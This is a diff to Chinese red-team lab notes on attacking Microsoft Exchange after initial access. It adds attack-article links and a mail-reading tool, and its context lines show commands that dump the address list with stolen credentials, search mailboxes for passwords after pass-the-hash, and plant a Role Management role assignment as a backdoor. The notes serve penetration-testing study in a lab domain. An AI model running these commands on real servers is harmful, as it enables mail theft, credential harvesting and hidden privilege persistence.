@@ -12,6 +12,10 @@
 
 ---
 
+**简介**
+
+Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。简单而言， Exchange server 可以被用来构架应用于企业、学校的邮件系统。Exchange server 还是一个协作平台。在此基础上可以开发工作流，知识管理系统，Web 系统或者是其他消息系统。
+
 **相关文章**
 - [渗透测试中的Exchange](https://www.anquanke.com/post/id/226543)
 - [渗透技巧——获得Exchange GlobalAddressList的方法](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Exchange-GlobalAddressList%E7%9A%84%E6%96%B9%E6%B3%95/)
@@ -23,6 +27,7 @@
 - [Exchange EWS接口的利用](https://www.t00ls.net/thread-62442-1-3.html)
 - [针对Exchange的攻击方式](https://tttang.com/archive/1487/)
 - [各个阶段 Exchange 的利用手法](https://mp.weixin.qq.com/s/6rPQD6zTVrqwOIREMAavpQ)
+- [『红蓝对抗』Exchange的渗透流程（一）](https://mp.weixin.qq.com/s/yU0LGNI-D30VZ3A89p1x-A)
 
 **状况检查**
 - [dpaulson45/HealthChecker](https://github.com/dpaulson45/HealthChecker) - Exchange Server 运行状况检查脚本
@@ -265,7 +270,7 @@ ecp ——> 收件人 ——> 目标用户 ——> 邮件委托 ——> 完全�
 
 ![](../../../../../assets/img/Security/RedTeam/后渗透/实验/Exchange/8.png)
 
-### 导出邮箱列表
+### 邮箱列表导出
 
 **GlobalAddressList**
 
@@ -394,9 +399,9 @@ python3 exchanger.py island.com/zhangsan:ZS@123qwe@192.168.123.123 nspi dump-tab
 
 ---
 
-### 搜索自身邮件
+### 邮件导出
 
-如果爆出了密码，直接 web端访问 /OWA 登录查看。
+如果爆出了密码，直接 web 端访问 /OWA 登录查看。
 
 如果获得了 hash，可以 pth 后 Invoke-SelfSearch 访问 /ews 查看：
 ```bash
@@ -408,6 +413,9 @@ Invoke-SelfSearch -Folder all -Mailbox lisi@island.com -ExchHostname win2012-ex2
 # 配合 mimikatz 实现 pth 后搜索
 Invoke-SelfSearch -Folder all -Mailbox zhangsan@island.com -ExchHostname win2012-ex2016.island.com -MailsPerUser 500 -Terms "*password*","*creds*","*credentials*","*测试*","*密码*","*拓扑*","*运维*","*VPN*","*账号*" -OutputCsv zhangsan-email-search.csv
 ```
+
+**相关工具**
+- [b0bac/GetMail](https://github.com/b0bac/GetMail) - 利用NTLM Hash读取Exchange邮件
 
 ---
 
@@ -515,7 +523,7 @@ Get-ManagementRole -Cmdlet New-ManagementRoleAssignment
 New-ManagementRoleAssignment -Role "Role Management" -User zhangsan -Name "Role Management Back"
 
 # 查看角色授权是否成功
-Get-ManagementRoleAssignment –Role "Role Management"|Format-List
+Get-ManagementRoleAssignment -Role "Role Management"|Format-List
 
 # 删除某个角色授权
 Remove-ManagementRoleAssignment -Identity "Role Management Back" -Confirm:$false
